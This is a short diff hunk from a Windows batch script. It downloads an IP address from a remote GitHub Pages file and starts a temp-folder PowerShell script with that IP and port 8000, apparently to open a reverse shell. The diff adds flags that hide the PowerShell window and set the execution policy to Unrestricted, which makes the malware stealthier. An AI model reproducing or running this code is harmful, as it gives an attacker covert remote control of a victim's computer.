@@ -20,8 +20,8 @@ echo $KLK.Close^(^)
 
 for /f %%i in ('curl -kLs stivengiv.github.io/revs/ip.txt') do (set "_ip=%%i")
 if [%1]==[] (
-powershell %temp%\331.ps1 %_ip% 8000 >nul 2>&1
+powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %_ip% 8000 >nul 2>&1
 ) else (
-powershell %temp%\331.ps1 %1 8000 >nul 2>&1
+powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %1 8000 >nul 2>&1
 )
 exit
